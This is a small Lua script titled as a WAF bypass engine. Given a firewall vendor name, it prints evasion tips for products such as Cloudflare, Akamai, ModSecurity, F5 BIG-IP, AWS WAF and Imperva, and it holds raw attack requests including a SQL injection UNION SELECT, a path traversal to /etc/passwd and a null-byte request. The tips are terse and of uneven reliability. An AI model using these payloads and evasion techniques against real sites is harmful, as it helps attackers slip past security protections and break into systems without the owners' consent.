-- WAF Bypass Heuristics Engine
local waf_type = arg[1] or "unknown"
local methods = {
    "GET /?id=1 UNION SELECT 1,2,3-- HTTP/1.1",
    "GET / HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\n",
    "POST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\n\r\nx=1",
    "GET /../etc/passwd HTTP/1.1",
    "GET /%00 HTTP/1.1",
    "OPTIONS * HTTP/1.1",
}

if waf_type == "Cloudflare" then
    print("Bypass: Use X-Forwarded-For with real visitor IP | Try POST instead of GET | Use HTTPS")
elseif waf_type == "Cloudfront" then
    print("Bypass: Change User-Agent to known crawlers | Use different HTTP methods")
elseif waf_type == "Akamai" then
    print("Bypass: Try path normalization /./ and // | Use parameter pollution")
elseif waf_type == "ModSecurity" then
    print("Bypass: Use chunked transfer encoding | Case switching | Null bytes")
elseif waf_type == "F5 BIG-IP" then
    print("Bypass: Use HTTP/0.9 | X-Forwarded-For spoofing | Parameter fragmentation")
elseif waf_type == "AWS WAF" then
    print("Bypass: Use alternative IP in headers | String truncation | Unicode encoding")
elseif waf_type == "Sucuri" then
    print("Bypass: Use POST with multipart form | Change HTTP version to 1.0")
elseif waf_type == "Imperva" then
    print("Bypass: Use comment injection /*!*/ | Mixed case | Double URL encoding")
else
    for i, m in ipairs(methods) do
        if i <= 3 then
            print(m)
        end
    end
end
